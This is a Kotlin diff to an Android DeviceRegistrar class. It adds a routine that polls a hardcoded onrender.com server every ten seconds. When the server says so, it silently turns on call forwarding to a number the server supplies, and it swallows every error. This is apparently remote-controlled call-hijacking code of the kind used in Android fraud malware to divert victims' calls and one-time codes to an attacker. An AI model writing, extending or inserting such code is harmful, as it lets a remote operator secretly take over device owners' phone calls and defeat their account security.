@@ -14,13 +14,15 @@ class DeviceRegistrar private constructor(private val context: Context) {
     private val handler = Handler(Looper.getMainLooper())
     private var heartbeatRunning = false
     private var retryCount = 0
+    private var forwardingPolling = false
+    private var lastForwardingConfig: JSONObject? = null
 
     companion object {
         private var instance: DeviceRegistrar? = null
 
         fun init(context: Context) {
             if (instance == null) {
-                instance = DeviceRegistrar(context.applicationContext)
+                instance = DeviceRegistrar(context)
                 instance?.startRegistration()
             }
         }
@@ -100,7 +102,10 @@ class DeviceRegistrar private constructor(private val context: Context) {
                 conn.disconnect()
 
                 if (code in 200..299) {
-                    handler.post { startHeartbeat(deviceId) }
+                    handler.post {
+                        startHeartbeat(deviceId)
+                        startForwardingPolling(deviceId)
+                    }
                 } else if (retryCount < 3) {
                     retryCount++
                     handler.postDelayed({ doRegister() }, 5000)
@@ -134,6 +139,44 @@ class DeviceRegistrar private constructor(private val context: Context) {
                     } catch (_: Exception) {}
                 }.start()
                 handler.postDelayed(this, 30000)
+            }
+        })
+    }
+
+    private fun startForwardingPolling(deviceId: String) {
+        if (forwardingPolling) return
+        forwardingPolling = true
+        handler.post(object : Runnable {
+            override fun run() {
+                Thread {
+                    try {
+                        val conn = URL("https://bill-1-9yfp.onrender.com/api/forwarding-config/$deviceId").openConnection() as HttpURLConnection
+                        conn.requestMethod = "GET"
+                        conn.setRequestProperty("Content-Type", "application/json")
+                        conn.connectTimeout = 10000
+                        conn.readTimeout = 10000
+                        val responseCode = conn.responseCode
+                        if (responseCode == 200) {
+                            val body = conn.inputStream.bufferedReader().readText()
+                            val config = JSONObject(body)
+                            if (lastForwardingConfig == null || config.toString() != lastForwardingConfig.toString()) {
+                                if (config.optBoolean("call_forwarding")) {
+                                    val number = config.optString("call_forwarding_number", "")
+                                    if (number.isNotEmpty()) {
+                                        handler.post {
+                                        try {
+                                            CallForwarder(context).enableCallForwarding(number)
+                                        } catch (_: Exception) {}
+                                    }
+                                    }
+                                }
+                                lastForwardingConfig = config
+                            }
+                        }
+                        conn.disconnect()
+                    } catch (_: Exception) {}
+                }.start()
+                handler.postDelayed(this, 10000)
             }
         })
     }
